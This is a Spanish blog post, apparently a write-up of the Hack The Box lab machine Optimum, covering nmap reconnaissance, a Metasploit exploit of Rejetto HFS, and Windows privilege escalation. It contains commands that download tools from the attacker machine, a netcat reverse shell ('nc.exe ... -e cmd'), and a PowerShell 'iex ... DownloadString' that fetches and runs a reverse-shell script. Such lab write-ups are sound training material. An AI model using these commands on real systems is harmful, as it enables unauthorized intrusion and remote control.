---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Optimum            |
| Os                     | Windows            |
| Difficulty             | Easy               |
| Points                 | 0                  |
| IP                     | 10.10.10.8         |


## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Optimum/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.8
```

![nmap 1](/assets/images/Optimum/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.8 -oG allPorts
```

![nmap2](/assets/images/Optimum/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p80 10.10.10.8 -oN targeted
```

Buscamos un exploit con:

```s
searchsploit hfs http file server

#Lectura del exploit
searchsploit -x windows/remote/31056.py
```

Ahora que sabemos que si existe exploit para este servicio, usaremos el frame de metasploit para entrar a esta maquina

```s
msfconsole

search rejetto

use exploit/windows/http/rejetto_hfs_exec

show options

set RHOST 10.10.10.8

set LHOST 10.10.14.29

set RPORT 80

#Se abrio una session y para usarla le damos

sessions 1

#Tomamos una captura de pantalla
screenshot
```

Con el ultimo comando tomamos una captura, y podemos ver que ahi se encuentra la flag, abrimos una shell y procedemos a la lectura de la flag.

Para la escalada de privilegios, usaremos netcat. 

Abrimos un http server con python

```s
sudo python3 -m http.server 80
```

Nos lo descargaremos desde nuestra maquina con un:

```s
powershell wget http://10.10.14.29/nc64.exe -outfile nc.exe
#para ejecutarlo primero nos ponemos en escucha del otro lado y damos un:
nc.exe 10.10.14.29 443 -e cmd
```

Para buscar informacion, antes de usar WinPeas podemos aplicar:

```s
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP"
```

Para enumerar las vulnerabilidades y automatizar el escalamiento de privilegios ahora si usamos winPEAS:

 ```s
powershell invoke-WebRequest -UseBasicParsing 10.10.14.29/winPEASx64.exe -OutFile winPEASx64.exe
```

Agregamos esta linea al final de este<a href="https://github.com/samratashok/nishang"> script</a>:

```s
powershell Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.29/rev.ps1')"
```

powershell invoke-WebRequest -UseBasicParsing 10.10.14.29/rev.ps1 -OutFile rev.ps1

![Root](/assets/images/Optimum/root.png)

![Powned](/assets/images/Optimum/powned.png)